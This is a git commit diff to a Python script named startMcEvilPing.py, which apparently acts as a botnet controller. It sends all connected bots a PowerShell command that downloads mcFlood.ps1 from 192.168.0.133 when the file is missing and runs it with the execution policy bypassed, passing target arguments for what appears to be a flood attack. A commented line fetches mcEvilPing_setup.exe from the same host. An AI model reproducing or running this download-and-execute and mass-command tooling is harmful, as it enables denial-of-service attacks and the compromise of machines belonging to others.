655da4c5c92a3a32e570a3a72ae8635effe19188
lexert19 <dominikch19@gmail.com>
2021-04-05 18:35:10 +0200

    added bots container

--- scripts/startMcEvilPing.py
+++ scripts/startMcEvilPing.py
@@ -5,12 +5,14 @@ s.connect(("127.0.0.1",7676))
 
 script = """
 if(Test-Path 'C:\mcFlood.ps1'){
-Start-Process -FilePath 'powershell' -ArgumentList '-executionpolicy bypass C:\mcFlood.ps1 """+sys.argv[1]+""" """+sys.argv[2]+""" """+sys.argv[3]+"""';
+Start-Process -FilePath 'powershell' -ArgumentList '-executionpolicy bypass -File C:\mcFlood.ps1 """+sys.argv[1]+""" """+sys.argv[2]+""" """+sys.argv[3]+"""';
 }else{
 (New-Object Net.WebClient).DownloadFile('http://192.168.0.133/mcFlood.ps1', 'C:\\mcFlood.ps1');
-Start-Process -FilePath 'powershell' -ArgumentList '-executionpolicy bypass C:\mcFlood.ps1 """+sys.argv[1]+""" """+sys.argv[2]+""" """+sys.argv[3]+"""';
+Start-Process -FilePath 'powershell' -ArgumentList '-executionpolicy bypass -File C:\mcFlood.ps1 """+sys.argv[1]+""" """+sys.argv[2]+""" """+sys.argv[3]+"""';
 }
 """
+script = script.replace("\n","")
+
 command = f"/sendTAll \"{script}\" \n"
 s.send(bytes(command, 'utf-8') )
 #downloadFile = "Invoke-WebRequest -Uri http:\\\\192.168.0.133\mcEvilPing_setup.exe -OutFile C:\\mcEvilPing_setup.exe;"
